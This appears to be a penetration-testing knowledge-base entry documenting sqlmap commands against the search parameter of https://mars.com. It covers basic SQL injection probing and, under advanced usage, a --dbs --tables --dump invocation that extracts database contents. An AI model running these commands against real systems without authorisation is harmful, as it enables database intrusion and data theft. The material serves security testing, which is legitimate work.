---
id: 123e4567-e89b-12d3-a456-426614174002
name: sqlmap-test-sqli
type: command
executor: bash
data: 'sqlmap -u "https://mars.com/search?q=test" --batch --level=1 --risk=1'
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:36.304Z'
platforms:
  - Linux
  - Windows
  - macOS
tags:
  - sqli
  - testing
  - injection
verified: false
validated: true
submitted: true
---

# sqlmap-test-sqli

## Command

```bash
sqlmap -u "https://mars.com/search?q=test" --batch --level=1 --risk=1
```

## Description

This command uses sqlmap to test a web application's search endpoint for SQL injection vulnerabilities. It sends basic payloads to detect if the query parameter is injectable, suitable for initial reconnaissance in web penetration testing.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-u` | Target URL with vulnerable parameter | Yes |
| `--batch` | Non-interactive mode, accepts defaults | No |
| `--level=1` | Payload level (1=lowest, increases test depth) | No |
| `--risk=1` | Risk level (1=lowest, higher risks more invasive tests) | No |

## Examples

### Basic Usage

```bash
sqlmap -u "https://mars.com/search?q=test" --batch
```

### Advanced Usage

```bash
sqlmap -u "https://mars.com/search?q=test" --dbs --tables --dump --batch
```

## Expected Output

If vulnerable, sqlmap will output details like: `Parameter: q (GET) Type: boolean-based blind` followed by detected injection techniques and potential database information. Non-vulnerable endpoints show `not injectable`.

## Related

- [[Related Procedure: Exploit-SQL-Injection-in-Search-Functionality]]
